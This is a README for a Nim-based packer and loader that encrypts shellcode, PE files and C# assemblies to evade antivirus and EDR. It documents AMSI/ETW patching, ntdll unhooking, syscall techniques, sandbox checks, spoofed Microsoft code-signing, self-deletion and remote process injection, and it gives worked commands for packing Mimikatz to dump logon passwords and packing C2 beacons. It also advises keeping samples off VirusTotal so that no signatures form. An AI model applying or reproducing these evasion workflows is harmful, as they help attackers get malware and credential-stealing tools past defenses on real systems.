# NimSyscallPacker / Loader

For some this might be self explanatory - but please don't upload the resulting payloads to VirusTotal or similar services. This will in the worst case lead to many signatures for the packed binaries and makes the tool useless. Use https://antiscan.me/ instead.

This Packer can be used to pack any C# Assembly, PE-File or Shellcode into a Nim binary. It will encrypt the target payload, build the corresponding Nim source code according to the given arguments and compiles it to an Nim binary.


### Setup

A Video - if you prefer that - can be found here:
[https://youtu.be/0PwIn3Nxmgo](https://youtu.be/0PwIn3Nxmgo)

#### Windows

Git needs to be installed for Nim/Nimble to work properly.

Download and install [Nim 1.6.2](https://nim-lang.org/download/nim-1.6.2_x64.zip) and [Mingw64](https://sourceforge.net/projects/mingw-w64/files/) version 8.1.0 `x86_64-posix-seh`. You can either just use this GCC version or in addition install [GCC 12.1.0](https://sourceforge.net/projects/gcc-win64/files/12.1.0/). Don't use other GCC versions, as that breaks some functionality. But you need to place the Mingw64 DLL's around `libwinpthread-1.dll` into some `%PATH%` environment variable folder. Login/logout for the `%PATH%` changes to take effect.

Install dependencies:
`nimble install nimcrypto docopt ptr_math strenc winim`

If you want to use LLVM obfuscator on windows you need to use my embedded denim version as it's modified code to make it work with the Packer. My modified code can be found [here]([denim](https://github.com/S3cur3Th1sSh1t/denim)). Install it via `denim\denim.exe setup`.

Compile the Packer via `nim c NimSyscallLoader.nim`. Ready to go.

#### Linux

E.g. on Kali:

`apt-get install nim=1.6.2`

`apt-get install mingw-64=8.0.0-1`

`nimble install nimcrypto docopt ptr_math strenc winim`

If you cannot downgrade mingw-64 to 8.0.0-1 `--hellsgate` won't work.

Install donut via `pip3 install donut-shellcode`. `denim` cannot be used from Unix so obfuscation via LLVM is not possible here. Same for Callobfuscator.

Compile the Packer via `nim c NimSyscallLoader.nim`. Ready to go.

#### Third party deps

If you want to make use of Code Signing certificates via LimeLighter you'll also need the following things installed and in your %PATH%:
openssl - (for Windows) for example from [here](https://slproweb.com/products/Win32OpenSSL.html)
osslsigncode - for example from [here](https://github.com/mtrojnar/osslsigncode/releases/tag/2.3)

##### Third party tool support

I will not give Support for issues in the third party tools which are used here. So please open up an issue in the corresponsing repositories if you're facing problems with them. Third party tools in use:

- [Donut](https://github.com/TheWover/donut)
- [Denim](https://github.com/moloch--/denim)
- [LimeLighter](https://github.com/Tylous/Limelighter)
- [Callobfuscator](https://github.com/d35ha/CallObfuscator)
- [NimlineWhispers3](https://github.com/klezVirus/NimlineWhispers3)

### Usage

A Video - if you prefer that - can be found here:
[https://youtu.be/UHaIgdzqHDA](https://youtu.be/UHaIgdzqHDA)

```
NimSyscall_Loader v 1.6

Usage:
  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
  NimSyscall_Loader (-h | --help)
  NimSyscall_Loader --version

Options:

[general]

  -h --help     Show this screen.
  --version     Show version.
  --file filename  File to encrypt.
  --key key     Key to encrypt with
  --output filename    Filename for encrypted exe/dll
  --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
  --noRES    Don't set custom resource file information (cmd icon, CMD description by default)
  --dll     Generate DLL instead of an exe
  --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions
  --noETW    Don't use ETW Patch
  --noAMSI    Don't patch AMSI
  --noArgs    Don't provide any arguments to the assembly (some can only run without args)
  --hide    Compile with --app:gui flag, so that the console won't pop up
  --APIhide    Console won't pop up, hidden via API calls 'GetConsoleWindow' and 'ShowWindow' with 'SW_HIDE'
  --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
  --debug    Compiles the binary in debug mode
  --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
  --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
  --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
  --verbose    Prints output to the console (for troubleshooting purposes)

[evasion]

  --sleep 10    Sleep 10 seconds before decryption to evade in memory scanners
  --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
  --unhook    Unhook ntdll.dll before doing anything else for the current process
  --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
  --sgn    Encode shellcode via SGN before encrypting it´
  --replace    Replace common nim IoC's in the loader like the string 'nim'
  --sandbox value    Include Sandbox Checks of your choice into the loader:
                     Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                     DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
                     DiskSpace -> Only execute if c:\ disk space >= 200GB
                     MemorySpace -> Only execute if more than 4GB RAM available
                     Emulated -> VirtualAllocExNuma API call (Some sandboxes do not emulate that)
        --domain targetdomain    Specify a domain for SandBox Evasion
  --pump value    Pump the file with:
                  words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
                  reputation -> Pump reputation with strings from well known binaries e.g. Chrome,Cortana,Discord and some others
  --self-delete    The loader deletes it's own executable on runtime (Credit to @byt3bl33d3r and @jonasLyk)
  --obfuscatefunctions    Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator (https://github.com/d35ha/CallObfuscator - only possible from a Windows OS)
  --sign    Sign the binary with a spoofed certificate
      --signdomain www.example.com    The domain to use for the certificate (default is www.microsoft.com)
  --llvm    Add compiler flags for LLVM obfuscation, you have to set it up by yourself
  --sleepycrypt    Encrypt the memory of the loader with SleepyCrypt # experimental (Pre-Alpha, not working yet for C2-Stager)
  --fluctuate    Enable ShellcodeFluctuation for local shellcode injection and PE-Loading (Alpha) - no support for remote injection
                 This will only work for C2-Payloads, that use Win32 Sleep in between connection attempts, as that is hooked
  --antidebug    Checks the BeingDebugged flag of the current process and if it is set, it will quit

[Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]

  --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
  --syswhispers    Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique
        --jump    When using Syswhispers3, use the jumper_randomized technique

[shellcode specific]

  --shellcode    Encrypt shellcode to load it on runtime
  --localCreateThread    Use NtCreateThreadEx for local injection instead of a direct pointer to the shellcode
  --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
      --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
      --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
                         Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
      --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
      --remotepatchETW    Patch ETW in the remote process before shellcode execution
  
[PE Packing]

  --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
  --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE

[C# assembly Packing]

  --csharp    Encrypt a C# assembly to load it on runtime
```


To pack Mimikatz for example with unhooking before execution and without patching AMSI use the following:

```
NimSyscallLoader --file=mimikatz.exe --unhook --noAMSI --peinject
```

Some of you had problems loading Mimikatz with the packer via "--file=Mimikatz --peload" arguments to afterwards issue custom commands on runtime.

I found the reason for this behaviour. Don't ask me why but you cannot just take the release from Github but have to compile Mimikatz on your own (or build a custom version) and load this instead of the official release.

If you still want to embed the release version from github you can directly pass arguments like this:

```
Packedmimikatz.exe coffee exit
```

You can also hardcode arguments for `--peload`, `--csharp` or `--peinject` payloads, e.g. the following would patch the command line arguments to be `privilege::debug sekurlsa::logonpasswords exit`:

```
NimSyscallLoader --file mimikatz.exe --peload --arguments "privilege::debug sekurlsa::logonpasswords exit"
``` 

Donut shellcode is detected by some AV/EDR vendors. As alternative for PE-Loading I modified my [Nim-RunPE](https://github.com/S3cur3Th1sSh1t/Nim-RunPe) to use Syscalls for PE-Loading and integrated it here:

To pack Mimikatz for example and load it via syscall PE-Loader use the following:

```
NimSyscallLoader --file=mimikatz.exe --peload
```

To pack Shellcode for local injection:

```
NimSyscallLoader --file=shellcode.bin --noAMSI
```

To load shellcode into a remote process:

```
NimSyscallLoader --file=shellcode.bin --noAMSI --remoteprocess=teams.exe
```

To load a C# assembly:
```
NimSyscallLoader --file=Seatbelt.exe --csharp
```
To load a C# assembly with flags:
```
NimSyscallLoader --file=Rubeus.exe --csharp --flags='hash /password:Aa1234'
```

To load a C# assembly and use hellsgate for Syscall retrieval :
```
NimSyscallLoader --file=Seatbelt.exe --csharp --hellsgate
```

To pack Shellcode for local injection + hellsgate usage + self-delete + sandbox checks:

```
NimSyscallLoader --file=beacon.bin --hellsgate --self-delete --sandbox=DomainJoined,MemorySpace
```

To add several thousand english words to bypass "Machine learning" detections:

```
NimSyscallLoader --file=Seatbelt.exe --csharp --pump=words
```

To use Syswhispers3 with/without jumper_randomized technique:

```
NimSyscallLoader --file=calc.bin --syswhispers
NimSyscallLoader --file=calc.bin --syswhispers --jump
```

To encode shellcode with sgn before encrypting:

```
NimSyscallLoader --file=calc.bin --sgn
NimSyscallLoader --file=mimikatz.exe --peinject --sgn
```

To spawn a custom process and inject into that afterwards + Patch AMSI/ETW in the remote process:

```
NimSyscallLoader --file=calc.bin --remoteinject --customprocess rundll32.exe --remotepatchAMSI --remotePatchETW
```

To generate an DLL as output instead of an executable just add the `--dll` parameter. You can also define custom export functions via `--dllexportfunc Export1,ExportFunc2`. Theese custom exports can also be used for DLL sideloading.

LLVM description stolen from [https://github.com/icyguider/Nimcrypt2](https://github.com/icyguider/Nimcrypt2) - I did not test this myself yet!

**OPTIONAL:** To use the [Obfuscator-LLVM](https://github.com/heroims/obfuscator) flag, you must have it installed on your system alongside [wclang](https://github.com/tpoechtrager/wclang). I've found this to be a bit of a pain but you should be able to do it with a little perseverance. Here's a quick step-by-step that worked on my Kali Linux system:
1. Clone desired version of Obfuscator-LLVM and build it
2. Once compiled, backup the existing version of clang and move the new Obfuscator-LLVM version of clang to /usr/bin/
3. Install wclang and add it's binaries to your PATH
4. Backup existing clang library files, copy new newly built Obfuscator-LLVM library includes to /usr/lib/clang/OLD_VERSION/

In addition, you must add the following lines to your `nim.cfg` file to point nim to your wclang binaries:
```
amd64.windows.clang.exe = "x86_64-w64-mingw32-clang"
amd64.windows.clang.linkerexe = "x86_64-w64-mingw32-clang"
amd64.windows.clang.cpp.exe = "x86_64-w64-mingw32-clang++"
amd64.windows.clang.cpp.linkerexe = "x86_64-w64-mingw32-clang++"
```

### Custom Images or meta data

If you want to use custom Icons for your loader executables or custom metadata, you should change the `cmd.rc` file in the resources folder.

That can be compiled to an `cmd.o` file via `windres cmd.rc -o cmd.o`. You can also just replace the `demo.ico` file with any other ICON file you want to use.

For DLL metadata you can change `DLL.rc`.

### Memory encryption

Currently, the Packer has two memory encryption techniques embedded. It's either `--fluctuate` for ShellcodeFluctuation or `--sleepycrypt` for SleepyCrypt.

ShellcodeFluctuation can currently only be used for C2-Payloads, that use Win32 Sleep as it hooks this function. In this case only the Shellcode will get encrypted in the stack everytime the implant sleeps.

SleepyCrypt will not only encrypt the Shellcode but the whole PE-Stack, meaning all sections of it. The downside is, that the encryption is independent of your implant and will take place in a fixed time value, e.g. 10 secconds encryption and one seccond execution time. This may lead to problems with execution for some C2-Frameworks.

## ProtectMyTooling embedded

[mgeeky](https://github.com/mgeeky) also wrote a wrapper script for this Packer in his private ProtectMyTooling repository to automate the process of packing binaries with my packer. No need to choose options there for you. Also consider sponsoring him, as his private tool collection is worth it. :+1:

## TO-DO
- [x] PELoader via syscalls
- [x] Hellsgate support
- [X] Load only the needed Winim libraries
- [x] Remote process AMSI/ETW Patching based on [SnD_AMSI](https://github.com/whydee86/SnD_AMSI)
- [X] Use Syscalls for remote patching
- [X] Remotely load the "to patch" DLL (ntdll or amsi.dll) into the remote process before patching (otherwise it won't help us)
- [x] Hellsgate support for remote shellcode injection + PELoading
- [X] DLL output
- [X] DLL Sideloading capabilities
- [ ] C# and/or Powershell output files
- [X] More syscalls and or D/Invoke for win32 functions
- [X] Cobalt Strike integration - CNA
- [ ] Passing parameters via e.g. manipulation of the PEB field (Command line spoofing like)
- [X] Passing parameters via API import function patching
- [X] Shellcode memory encryption via Sleep Hook [ShellcodeFluctuation like](https://github.com/mgeeky/ShellcodeFluctuation)
- [X] Calling the ‘GetConsoleWindow’ and ‘ShowWindow’ Windows function after the process is created and the EDR’s hooks are loaded, and then changes the windows attributes to hidden instead of GUI compile flags
- [ ] More sleeps in between some potentially critical stubs
- [X] Define custom remote process to spawn before injecting into it (atm it's hardcoded notepad)
- [ ] PPID Spoofing for newly created processes
- [ ] BlockDLLs for new processes
- [ ] Patchless AMSI bypass (e.g. https://gist.github.com/CCob/fe3b63d80890fafeca982f76c8a3efdf)
- [X] More ETW Patching for EtwNotificationRegister, EtwEventRegister, EtwEventWriteFull
- [ ] Service binary support, like https://github.com/enthus1ast/nimWindowsService/
- [ ] DLL hijacking switch for DLLMain with process attach
- [ ] Fix x86 bugs, mostly casting but some other strange behaviours
- [ ] Add `--pump` null bytes in between like https://gitlab.com/ORCA000/entropyfix (Have to test, may cause crashes)
- [ ] CPL Output files



## CREDITS

- [X] [@WhyDee86](https://twitter.com/WhyDee86) - Sleep function + remote process Library module + hardcoded arguments initial code
- [X] [@chvancooten](https://twitter.com/chvancooten) - Custom strenc + Inspiration from his Nim Packer
- [X] [@lefayjey](https://github.com/lefayjey) - DLL Output + CNA Script contribution
- [X] [@d35ha](https://github.com/d35ha/CallObfuscator) - CallObfuscator
- [X] [@klezVirus](https://github.com/klezVirus/NimlineWhispers3) - NimlineWhispers3
- [X] [@TheWover](https://github.com/TheWover/donut) - Donut 
- [X] [@icyguider](https://github.com/icyguider) - Inspiration
- [X] [Tylous](https://github.com/Tylous/) - LimeLighter
- [X] [Mr-Un1k0d3r](https://github.com/Mr-Un1k0d3r) - 1 byte AMSI / ETW Patch + SandBox Evasion ideas
- [X] [glynx](https://github.com/glynx) - Nim-RunPE hardcoded arguments Pull Request
- [X] [moloch--](https://github.com/moloch--) - Denim
- [X] [EdgeBalci](https://github.com/EgeBalci) - SGN
